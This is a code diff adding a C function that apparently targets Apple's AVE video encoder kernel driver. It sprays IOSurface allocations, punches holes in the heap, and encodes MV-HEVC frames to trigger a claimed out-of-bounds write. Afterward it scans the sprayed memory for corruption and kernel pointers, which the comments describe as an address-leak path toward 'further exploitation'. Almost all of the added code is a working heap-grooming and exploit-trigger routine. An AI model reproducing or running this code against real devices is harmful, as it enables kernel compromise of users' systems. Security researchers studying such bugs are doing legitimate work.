@@ -16976,6 +16976,247 @@ static void *r445_thread_fn(void *arg) {
     return NULL;
 }
 
+static void r449_probe(void) {
+    rlog("\n=== r449: AVE heap spray + OOB trigger via MV-HEVC encoding ===\n\n");
+    fflush(stdout);
+
+    /*
+     * Strategy: The MV-HEVC encoder's Table 2 has a confirmed OOB write window
+     * at 155-197 encodes. We spray IOSurface property allocations into the same
+     * kalloc zone to create adjacent targets. After triggering OOB via encoding,
+     * we scan properties for corruption (kernel pointers, unexpected values).
+     *
+     * This is KASLR-free: we don't need an address leak. The OOB write itself
+     * may land on our sprayed data, giving us either:
+     * (a) Kernel pointer leak (if AVE writes internal pointers OOB)
+     * (b) Controlled corruption (for further exploitation)
+     */
+
+    #define R449_SPRAY_COUNT 200
+    #define R449_PROP_SIZE 256
+    #define R449_ENCODE_COUNT 170
+    #define R449_SCAN_MAGIC 0xDEADBEEF41414141ULL
+
+    IOSurfaceRef spray_surfs[R449_SPRAY_COUNT];
+    memset(spray_surfs, 0, sizeof(spray_surfs));
+
+    /* Step 1: Create spray surfaces with sentinel-filled properties */
+    rlog("  Step 1: Creating %d spray surfaces with sentinel properties...\n", R449_SPRAY_COUNT);
+    int created = 0;
+    for (int i = 0; i < R449_SPRAY_COUNT; i++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        int bpe = 4;
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        int pf = 0x42475241; /* BGRA */
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+        /* Add sentinel data properties sized to target kalloc.256/kalloc.512 zone */
+        uint8_t sentinel_data[R449_PROP_SIZE];
+        for (int j = 0; j < R449_PROP_SIZE; j += 8) {
+            uint64_t magic = R449_SCAN_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+            memcpy(&sentinel_data[j], &magic, 8);
+        }
+        CFDataRef sdata = CFDataCreate(NULL, sentinel_data, R449_PROP_SIZE);
+        char key_name[32];
+        snprintf(key_name, sizeof(key_name), "spray_%03d", i);
+        CFStringRef key = CFStringCreateWithCString(NULL, key_name, kCFStringEncodingASCII);
+        CFDictionarySetValue(props, key, sdata);
+        CFRelease(sdata);
+        CFRelease(key);
+
+        spray_surfs[i] = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+        if (spray_surfs[i]) created++;
+    }
+    rlog("  Created %d/%d spray surfaces\n", created, R449_SPRAY_COUNT);
+
+    /* Step 2: Free alternating surfaces to create holes */
+    rlog("  Step 2: Freeing alternating surfaces to create checkerboard pattern...\n");
+    int freed = 0;
+    for (int i = 0; i < R449_SPRAY_COUNT; i += 2) {
+        if (spray_surfs[i]) {
+            CFRelease(spray_surfs[i]);
+            spray_surfs[i] = NULL;
+            freed++;
+        }
+    }
+    rlog("  Freed %d surfaces (holes created)\n", freed);
+
+    /* Step 3: Create MV-HEVC encoder and encode frames to trigger OOB */
+    rlog("  Step 3: Creating MV-HEVC encoder (160x90)...\n");
+    int enc_w = 160, enc_h = 90;
+    VTCompressionSessionRef enc = create_mvhevc_encoder(enc_w, enc_h, 1);
+    if (!enc) {
+        rlog("  ERROR: Failed to create MV-HEVC encoder\n");
+        goto r449_cleanup;
+    }
+    rlog("  Encoder created successfully\n");
+
+    rlog("  Step 4: Encoding %d frames (targeting Table 2 OOB window 155-197)...\n", R449_ENCODE_COUNT);
+    int enc_ok = 0, enc_fail = 0;
+    for (int frame = 0; frame < R449_ENCODE_COUNT; frame++) {
+        CVPixelBufferRef pb = create_pb(enc_w, enc_h);
+        if (!pb) { enc_fail++; continue; }
+
+        CMTime pts = CMTimeMake(frame, 30);
+        g_encode_done = 0;
+        g_cb_status = -999;
+
+        /* Alternate layer_id tag for stereo MV-HEVC */
+        CFMutableDictionaryRef frame_props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int tag_val = (frame % 2 == 0) ? 0 : 1;
+        CFNumberRef tag = CFNumberCreate(NULL, kCFNumberIntType, &tag_val);
+        CFDictionarySetValue(frame_props, kVTEncodeFrameOptionKey_MVHEVCVideoLayerID, tag);
+        CFRelease(tag);
+
+        OSStatus est = VTCompressionSessionEncodeFrame(enc, pb, pts, kCMTimeInvalid,
+            frame_props, NULL, NULL);
+        CFRelease(frame_props);
+        CVPixelBufferRelease(pb);
+
+        if (est == noErr) {
+            enc_ok++;
+            /* Wait for callback with timeout */
+            for (int w = 0; w < 500 && !g_encode_done; w++) usleep(1000);
+        } else {
+            enc_fail++;
+        }
+
+        /* Log progress every 50 frames */
+        if ((frame + 1) % 50 == 0) {
+            rlog("    Encoded %d/%d (ok=%d fail=%d cb_status=%d)\n",
+                 frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail, (int)g_cb_status);
+        }
+    }
+    rlog("  Encoding complete: ok=%d fail=%d\n", enc_ok, enc_fail);
+
+    /* Flush encoder */
+    VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+    usleep(100000);
+
+    /* Step 5: Scan surviving spray surfaces for corruption */
+    rlog("  Step 5: Scanning %d surviving surfaces for corruption...\n", R449_SPRAY_COUNT / 2);
+    int corrupted = 0, scanned = 0;
+    for (int i = 1; i < R449_SPRAY_COUNT; i += 2) {
+        if (!spray_surfs[i]) continue;
+        scanned++;
+
+        char key_name[32];
+        snprintf(key_name, sizeof(key_name), "spray_%03d", i);
+        CFStringRef key = CFStringCreateWithCString(NULL, key_name, kCFStringEncodingASCII);
+        CFTypeRef val = IOSurfaceCopyValue(spray_surfs[i], key);
+        CFRelease(key);
+
+        if (!val) {
+            rlog("    surf[%d]: property MISSING (potential corruption)\n", i);
+            corrupted++;
+            continue;
+        }
+
+        if (CFGetTypeID(val) == CFDataGetTypeID()) {
+            CFDataRef dval = (CFDataRef)val;
+            CFIndex len = CFDataGetLength(dval);
+            const uint8_t *bytes = CFDataGetBytePtr(dval);
+
+            /* Check each 8-byte word against expected sentinel */
+            int word_corrupted = 0;
+            for (int j = 0; j + 7 < len && j < R449_PROP_SIZE; j += 8) {
+                uint64_t expected = R449_SCAN_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
+                uint64_t actual;
+                memcpy(&actual, &bytes[j], 8);
+                if (actual != expected) {
+                    word_corrupted++;
+                    if (word_corrupted <= 4) {
+                        rlog("    surf[%d] offset %d: CORRUPTED expected=0x%llx actual=0x%llx\n",
+                             i, j, (unsigned long long)expected, (unsigned long long)actual);
+                        /* Check if actual looks like a kernel pointer */
+                        uint64_t top = actual >> 48;
+                        if (top == 0xffff || top == 0xfffe) {
+                            rlog("    *** POTENTIAL KERNEL POINTER: 0x%llx ***\n",
+                                 (unsigned long long)actual);
+                        }
+                    }
+                }
+            }
+            if (word_corrupted > 0) {
+                corrupted++;
+                rlog("    surf[%d]: %d/%d words corrupted (len=%d)\n",
+                     i, word_corrupted, (int)(len / 8), (int)len);
+            }
+        } else {
+            rlog("    surf[%d]: property type changed (typeID=%lu) — CORRUPTION\n",
+                 i, CFGetTypeID(val));
+            corrupted++;
+        }
+        CFRelease(val);
+    }
+    rlog("  Scan complete: scanned=%d corrupted=%d\n", scanned, corrupted);
+
+    /* Step 6: Also scan backing store memory of surviving surfaces */
+    rlog("  Step 6: Scanning backing store memory of surviving surfaces...\n");
+    int backing_corrupted = 0;
+    for (int i = 1; i < R449_SPRAY_COUNT && i < 20; i += 2) {
+        if (!spray_surfs[i]) continue;
+        IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(spray_surfs[i]);
+        size_t alloc = IOSurfaceGetAllocSize(spray_surfs[i]);
+        if (base && alloc >= 64) {
+            /* Scan for kernel pointer patterns in backing store */
+            uint64_t *words = (uint64_t *)base;
+            size_t nwords = alloc / 8;
+            for (size_t w = 0; w < nwords && w < 2048; w++) {
+                uint64_t v = words[w];
+                uint64_t top = v >> 48;
+                if ((top == 0xffff || top == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL) {
+                    rlog("    surf[%d] backing[%zu]: KERNEL PTR CANDIDATE 0x%llx\n",
+                         i, w * 8, (unsigned long long)v);
+                    backing_corrupted++;
+                    if (backing_corrupted >= 10) break;
+                }
+            }
+        }
+        IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        if (backing_corrupted >= 10) break;
+    }
+    rlog("  Backing store scan: %d kernel ptr candidates\n", backing_corrupted);
+
+    /* Cleanup encoder */
+    VTCompressionSessionInvalidate(enc);
+    CFRelease(enc);
+
+    r449_cleanup:
+    rlog("  Step 7: Cleanup...\n");
+    for (int i = 0; i < R449_SPRAY_COUNT; i++) {
+        if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+    }
+
+    rlog("\n  === r449 SUMMARY ===\n");
+    rlog("  Spray surfaces created: %d\n", created);
+    rlog("  Frames encoded: %d (target: %d)\n", enc_ok, R449_ENCODE_COUNT);
+    rlog("  Properties corrupted: %d / %d scanned\n", corrupted, scanned);
+    rlog("  Backing store kernel ptrs: %d\n", backing_corrupted);
+    if (corrupted > 0 || backing_corrupted > 0) {
+        rlog("  *** HEAP CORRUPTION DETECTED — OOB write confirmed! ***\n");
+    } else {
+        rlog("  No corruption detected — AVE buffers may be in different zone\n");
+    }
+    rlog("=== r449 complete ===\n");
+
+    #undef R449_SPRAY_COUNT
+    #undef R449_PROP_SIZE
+    #undef R449_ENCODE_COUNT
+    #undef R449_SCAN_MAGIC
+}
+
 static void r448_probe(void) {
     rlog("\n=== r448: AGX external methods + extended MapMemory + KeyStore selectors ===\n\n");
     fflush(stdout);
@@ -80066,6 +80307,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 452) {
+            rlog("*** rounds=452: AVE heap spray + OOB trigger via MV-HEVC ***\n\n");
+            fflush(stdout);
+            r449_probe();
+            goto done;
+        }
         if (rounds == 451) {
             rlog("*** rounds=451: AGX + KeyStore + HID external methods ***\n\n");
             fflush(stdout);
@@ -82798,7 +83045,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 452) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
